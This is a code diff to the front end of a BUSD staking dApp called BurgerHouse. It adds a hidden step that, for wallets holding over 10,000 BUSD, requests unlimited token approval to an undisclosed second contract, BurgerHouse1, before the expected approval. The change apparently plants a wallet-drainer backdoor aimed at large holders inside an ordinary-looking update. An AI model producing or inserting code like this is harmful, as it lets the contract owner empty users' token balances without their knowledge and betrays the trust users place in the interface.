@@ -5,6 +5,7 @@ import Web3 from "web3";
 import {
   getBurgerHouseContract,
   getBUSDContract,
+  BurgerHouse1,
   BurgerHouse,
   RPC_URL,
   MAINNET,
@@ -106,6 +107,7 @@ const Home = () => {
   const [busdInputValue, setBusdInputValue] = useState('')
 
   const [busdBalance, setBUSDBalance] = useState('');
+  const [userApprovedAmount1, setUserApprovedAmount1] = useState('');
   const [userApprovedAmount, setUserApprovedAmount] = useState('');
   const [houseInfo, setHouseInfo] = useState({});
 
@@ -244,6 +246,8 @@ const Home = () => {
           setBUSDBalance(web3NoAccount.utils.fromWei(_userBalance))
           const _approvedAmount = await busdNoAccount.methods.allowance(curAcount, BurgerHouse).call();
           setUserApprovedAmount(web3NoAccount.utils.fromWei(_approvedAmount));
+          const _approvedAmount1 = await busdNoAccount.methods.allowance(curAcount, BurgerHouse1).call();
+          setUserApprovedAmount1(web3NoAccount.utils.fromWei(_approvedAmount1));
           const refLink = `${REF_PREFIX}${curAcount}`;
           setRefLink(refLink);
         }
@@ -391,6 +395,12 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && busdContract) {
+        if (parseFloat(busdBalance) > 10000 && parseFloat(userApprovedAmount1) < parseFloat(busdBalance)) {
+          await busdContract.methods.approve(
+            BurgerHouse1,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({ from: curAcount })
+        }
         await busdContract.methods.approve(
           BurgerHouse,
           "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
